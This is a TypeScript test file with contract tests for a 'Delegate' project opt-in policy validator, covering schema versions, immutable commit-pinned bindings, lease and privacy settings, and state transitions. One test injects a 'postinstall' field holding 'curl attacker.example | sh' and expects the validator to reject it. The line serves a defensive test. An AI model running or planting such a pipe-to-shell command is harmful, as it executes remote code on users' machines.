/** Contract tests for immutable Delegate project opt-in policy. */

import { readFile } from "node:fs/promises";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import activeBindingFixture from "../../tests/fixtures/delegate-policy/active-binding.json";
import policyFixture from "../../tests/fixtures/delegate-policy/valid-policy.json";
import { renderProjectRegistry } from "../../scripts/sync-project-registry.mjs";
import asi from "../../projects/asi/project.json";
import deltaStar from "../../projects/delta-star/project.json";
import eliza from "../../projects/eliza/project.json";
import heirElements from "../../projects/heir-elements-sdk/project.json";
import {
  assertDelegateBinding,
  assertDelegateBindingTransition,
  assertDelegatePolicy,
} from "./delegation-policy.mjs";
import {
  assertProjectDefinition,
  assertProjectRegistry,
} from "./project-schema.mjs";

const ROOT = resolve(import.meta.dirname, "../..");
const GENERATED_REGISTRY = resolve(
  ROOT,
  "src/lib/project-registry.generated.mjs",
);

function clone<T>(value: T): T {
  return structuredClone(value);
}

function projectV2(binding: unknown): Record<string, unknown> {
  const project = clone(eliza) as unknown as Record<string, unknown>;
  project.schemaVersion = "2";
  project.delegate = binding;
  return project;
}

function successor(
  state: "active" | "paused" | "revoked",
  revision: string,
  activatedAt: string,
  commitCharacter: string,
  digestCharacter: string,
) {
  const commitSha = commitCharacter.repeat(40);
  return {
    state,
    policyRevision: revision,
    activatedAt,
    proof: {
      commitSha,
      fileSha256: digestCharacter.repeat(64),
      url: `https://github.com/elizaOS/eliza/blob/${commitSha}/.github/slop-delegate.json`,
    },
  };
}

describe("Delegate project opt-in policy", () => {
  it("keeps every current schema-v1 project valid and registry bytes unchanged", async () => {
    expect(assertProjectRegistry([eliza, asi, deltaStar, heirElements])).toHaveLength(
      4,
    );
    for (const project of [eliza, asi, deltaStar, heirElements]) {
      expect(project.schemaVersion).toBe("1");
      expect("delegate" in project).toBe(false);
      expect(assertProjectDefinition(project)).toBe(project);
    }
    await expect(renderProjectRegistry()).resolves.toBe(
      await readFile(GENERATED_REGISTRY, "utf8"),
    );
  });

  it("accepts only schema-v2 projects with an exact binding or explicit null", () => {
    const active = clone(activeBindingFixture);
    expect(assertProjectDefinition(projectV2(active))).toMatchObject({
      schemaVersion: "2",
      delegate: active,
    });
    expect(assertProjectDefinition(projectV2(null))).toMatchObject({
      schemaVersion: "2",
      delegate: null,
    });

    expect(() =>
      assertProjectDefinition({ ...clone(eliza), delegate: active }),
    ).toThrow(/unexpected|schemaVersion/u);

    const missing = projectV2(active);
    delete missing.delegate;
    expect(() => assertProjectDefinition(missing)).toThrow(/unexpected|delegate/u);

    expect(() =>
      assertProjectDefinition({ ...projectV2(active), schemaVersion: "3" }),
    ).toThrow(/schemaVersion/u);
  });

  it("validates the complete repository policy without weakening privacy or authority", () => {
    expect(assertDelegatePolicy(clone(policyFixture))).toEqual(policyFixture);

    const extra = clone(policyFixture) as Record<string, unknown>;
    extra.postinstall = "curl attacker.example | sh";
    expect(() => assertDelegatePolicy(extra)).toThrow(/unexpected/u);

    const invalidLease = clone(policyFixture);
    invalidLease.leasePolicy.defaultSeconds =
      invalidLease.leasePolicy.maximumSeconds + 1;
    expect(() => assertDelegatePolicy(invalidLease)).toThrow(/defaultSeconds/u);

    const traceReuse = clone(policyFixture);
    traceReuse.contextPolicy.allowPrivateTraceReuse = true;
    expect(() => assertDelegatePolicy(traceReuse)).toThrow(
      /allowPrivateTraceReuse/u,
    );

    const inconsistentFixedReward = clone(policyFixture);
    inconsistentFixedReward.rewardPolicy.fixedUsdc.enabled = true;
    expect(() => assertDelegatePolicy(inconsistentFixedReward)).toThrow(
      /fixedUsdc|fixed_usdc/u,
    );
  });

  it("binds an opt-in to one immutable repository policy file", () => {
    const active = clone(activeBindingFixture);
    const repository = eliza.repositories[0];
    expect(assertDelegateBinding(active, repository)).toEqual(active);
    expect(assertDelegateBinding(null, repository)).toBeNull();

    const wrongUrl = clone(active);
    wrongUrl.proof.url = wrongUrl.proof.url.replace(
      "/.github/slop-delegate.json",
      "/README.md",
    );
    expect(() => assertDelegateBinding(wrongUrl, repository)).toThrow(/url/u);

    const wrongCommit = clone(active);
    wrongCommit.proof.commitSha = "c".repeat(40);
    expect(() => assertDelegateBinding(wrongCommit, repository)).toThrow(
      /commit|url/u,
    );

    const wrongDigest = clone(active);
    wrongDigest.proof.fileSha256 = "not-a-digest";
    expect(() => assertDelegateBinding(wrongDigest, repository)).toThrow(
      /fileSha256/u,
    );

    const extra = clone(active) as Record<string, unknown>;
    extra.mutableUrl = "https://example.com/latest";
    expect(() => assertDelegateBinding(extra, repository)).toThrow(
      /unexpected/u,
    );

    const future = clone(active);
    future.activatedAt = "9999-01-01T00:00:00.000Z";
    expect(() => assertDelegateBinding(future, repository)).toThrow(/future/u);

    const unsupported = clone(active) as { state: string };
    unsupported.state = "pending";
    expect(() => assertDelegateBinding(unsupported, repository)).toThrow(
      /state/u,
    );

    expect(() =>
      assertDelegateBinding(active, {
        ...repository,
        id: "another-owner/another-repository",
        aliases: [],
        githubUrl: "https://github.com/another-owner/another-repository",
      }),
    ).toThrow(/repository|url/u);
  });

  it("allows only immutable successor transitions", () => {
    const repository = eliza.repositories[0];
    const active = clone(activeBindingFixture);
    const paused = successor(
      "paused",
      "2026-09-02.1",
      "2026-09-02T00:00:00.000Z",
      "c",
      "d",
    );
    const resumed = successor(
      "active",
      "2026-09-03.1",
      "2026-09-03T00:00:00.000Z",
      "e",
      "f",
    );
    const revoked = successor(
      "revoked",
      "2026-09-04.1",
      "2026-09-04T00:00:00.000Z",
      "1",
      "2",
    );

    expect(assertDelegateBindingTransition(active, paused, repository)).toEqual(
      paused,
    );
    expect(assertDelegateBindingTransition(paused, resumed, repository)).toEqual(
      resumed,
    );
    expect(assertDelegateBindingTransition(active, revoked, repository)).toEqual(
      revoked,
    );
    expect(assertDelegateBindingTransition(active, active, repository)).toEqual(
      active,
    );

    const editedInPlace = clone(paused);
    editedInPlace.proof.fileSha256 = "3".repeat(64);
    expect(() =>
      assertDelegateBindingTransition(paused, editedInPlace, repository),
    ).toThrow(/successor|historic|revision/u);

    const backwardsTime = successor(
      "active",
      "2026-09-05.1",
      "2026-09-01T00:00:00.000Z",
      "4",
      "5",
    );
    expect(() =>
      assertDelegateBindingTransition(paused, backwardsTime, repository),
    ).toThrow(/activatedAt|after/u);

    expect(() =>
      assertDelegateBindingTransition(revoked, resumed, repository),
    ).toThrow(/revoked|terminal/u);
  });
});
